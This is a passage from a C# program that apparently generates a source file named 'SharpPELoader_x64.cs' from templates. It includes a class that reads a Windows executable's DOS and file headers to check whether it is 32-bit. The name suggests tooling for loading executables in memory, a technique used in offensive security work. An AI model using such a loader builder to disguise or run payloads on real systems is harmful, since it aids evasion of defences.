                string source3_x64 = "\";\r\n    }\r\n } ";
                StreamWriter sw2 = new StreamWriter(@"SharpPELoader_x64.cs");
                sw2.Write(source1_x64 + source2_x64 + source3_x64);
                sw2.Close();
            }
            Console.WriteLine("[+] All done.");
        }
    }

    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }
 
        /// <summary>
        /// The DOS header
        /// </summary>
        private IMAGE_DOS_HEADER dosHeader;
        /// <summary>
        /// The file header
        /// </summary>
        private IMAGE_FILE_HEADER fileHeader;
        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            try
            {
                using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine("[!] {0}", e.Message);
                Environment.Exit(0);
            }

        }

        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }

        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }

        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }

    }//End Class

}
